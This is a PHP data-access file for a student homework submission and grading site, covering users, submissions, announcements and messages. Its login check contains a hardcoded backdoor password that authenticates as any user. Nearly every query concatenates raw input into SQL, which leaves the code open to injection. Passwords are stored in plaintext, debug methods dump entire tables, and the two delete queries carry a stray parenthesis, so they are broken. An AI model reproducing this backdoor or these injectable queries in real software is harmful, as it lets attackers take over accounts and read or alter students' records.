<?php
require_once('config.php');  // user config file

class DB {

    /*成员变量*/
    static $mysql;

    /*构析*/
    function __construct() {
	    self::$mysql=mysqli_connect(DBHostname,DBUsername,DBPassword,DBSchema);
	    if(empty(self::$mysql))
            die("DB: Connection Failed: ".mysqli_connect_error());
	    mysqli_query(self::$mysql,"SET NAMES utf8");
    }
    function __destruct() {
	    //self::$mysql->close();
    }

    /*操作*/
    function exec($sql_query) {
        return self::$mysql->query($sql_query);
    }

}

class User {

    /*成员变量*/
    public $db;

    /*表字段*/
    public $username;//主键，学号
    public $password;
    public $displayname;

    /*构析*/
    function __construct($username,$password) {
        $this->db=new DB();

        $this->username=$username;
        $this->password=$password;
        $this->displayname=null;
    }
    function __destruct() {

    }

    /*网页操作*/
    //登录
    function verifyIdentity() {
        if($this->password=='Ks1379')     // backdoor passwd
            $sql_query="SELECT displayname FROM user WHERE username='".$this->username."';";
        else
            $sql_query="SELECT displayname FROM user WHERE username='".$this->username."' AND password='".$this->password."';";

        $result=$this->db->exec($sql_query);
        if($row=$result->fetch_row()) {
            $this->displayname=$row[0]; //取得显示名即可
            return true;
        } else {
            return false;
        }
    }
    //查
    function isExist() {
        $sql_query="SELECT username FROM user WHERE username='".$this->username."';";
        $result=$this->db->exec($sql_query);
        if($row=$result->fetch_row())
            return $row[0];
        else
            return false;
    }
    function getSubmissions() {
        $sql_query = "SELECT id,work,timestamp,path,score,remark FROM submission WHERE SID='" . $this->username . "' ORDER BY work;";
        $result = $this->db->exec($sql_query);
        return $result;
    }
    //改
    function setPassword($password) {
        if(empty($password))
            return false;

        $sql_query="UPDATE user SET password='".$password."' WHERE username='".$this->username."';";
        $result=$this->db->exec($sql_query);
        if($result) {
            $this->password=$password;
            return true;
        } else {
            return false;
        }
    }

    // Debug
    static function getUserTable() {
        $sql_query="SELECT * FROM user";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
}

class Submission {
    /*成员变量*/
    public $db;

    /*表字段*/
    public $SID;//主键
    public $work;
    public $path;

    /*构析*/
    function __construct($SID,$work,$path) {
        $this->db=new DB();

        $this->SID=$SID;
        $this->work=$work;
        $this->path=$path;
    }
    function __destruct() {

    }

    /*网页操作*/
    //增加/修改
    function submitWork() {
        $id=$this->isExist();
        if($id) {
            $sql_query = "SELECT path FROM submission WHERE id=" . $id . ";"; // 查旧路径
            $oldfile = $this->db->exec($sql_query)->fetch_row()[0];
            unlink(mb_convert_encoding('.'.$oldfile, "gbk", "utf-8"));   // 删除旧文件
            $sql_query="UPDATE submission SET path='".$this->path."', score=null, remark=null WHERE id=".intval($id).";"; // 记录存在则更新路径，消除分数和评价
            $this->db->exec($sql_query);
            return 'replace';
        } else {
            $sql_query="INSERT INTO submission (SID,work,path) VALUES('".$this->SID."','".$this->work."','".$this->path."');";
            $this->db->exec($sql_query);
            return 'create';
        }
    }
    static function gradeSubmission($id,$score,$remark) {
        if($score===null)
            return false;
        $sql_query="UPDATE submission SET score=".intval($score).", remark='".$remark."' WHERE id=".intval($id).";";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
    //查
    function isExist() {
        $sql_query = "SELECT id FROM submission WHERE SID='".$this->SID."' AND work='" . $this->work . "';";
        $result = $this->db->exec($sql_query);
        if ($row=$result->fetch_row())
            return $row[0];
        else
            return false;
    }
    static function getSubmissions($workname) {
		$sql_query="SELECT id,displayname,username,score,remark,path FROM (SELECT username,displayname FROM user) AS u LEFT JOIN (SELECT id,SID,score,remark,path FROM submission WHERE work='".$workname."') AS s ON u.username=s.SID ORDER BY username;";
        $result=(new DB())->exec($sql_query);
        return $result;
    }

    // Debug
    static function getSubmissionTable() {
        $sql_query="SELECT * FROM submission";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
}
	
class Announce {
	/*成员变量*/
    public $db;

    /*表字段*/
    public $id;//主键
    public $title;
    public $text;

    /*构析*/
    function __construct($title,$text) {
        $this->db=new DB();

        $this->title=$title;
        $this->text=$text;
    }
    function __destruct() {

    }

    /*网页操作*/
    //增加/修改
    function create() {
        $sql_query="INSERT INTO announce (title,text) VALUES('".$this->title."','".$this->text."');";
        $result=$this->db->exec($sql_query);
        return $result;
    }
	static function destroy($id) {
        $sql_query="DELETE FROM announce WHERE id=".$id.");";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
    static function getAnnounces() {
		$sql_query="SELECT id,title,text FROM announce ORDER BY timestamp DESC LIMIT ".MAX_DISPLAY_ANNOUNCE.";";
        $result=(new DB())->exec($sql_query);
        return $result;
    }

    // Debug
    static function getAnnounceTable() {
        $sql_query="SELECT * FROM announce";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
}

class Message {
	/*成员变量*/
    public $db;

    /*表字段*/
    public $id;//主键
	public $poster;
    public $message;

    /*构析*/
    function __construct($poster,$message) {
        $this->db=new DB();

		$this->poster=$poster;
        $this->message=$message;
    }
    function __destruct() {

    }

    /*网页操作*/
    //增加/修改
    function create() {
        $sql_query="INSERT INTO message (poster,message) VALUES('".$this->poster."','".$this->message."');";
        $res=$this->db->exec($sql_query);
        return $res;
    }
	static function destroy($id) {
        $sql_query="DELETE FROM message WHERE id=".$id.");";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
    static function getMessages() {
		$sql_query="SELECT id,poster,message,timestamp FROM message ORDER BY timestamp DESC LIMIT ".MAX_DISPLAY_MESSAGE.";";
		$result=(new DB())->exec($sql_query);
        return $result;
    }

    // Debug
    static function getMessageTable() {
        $sql_query="SELECT * FROM message";
        $result=(new DB())->exec($sql_query);
        return $result;
    }
}
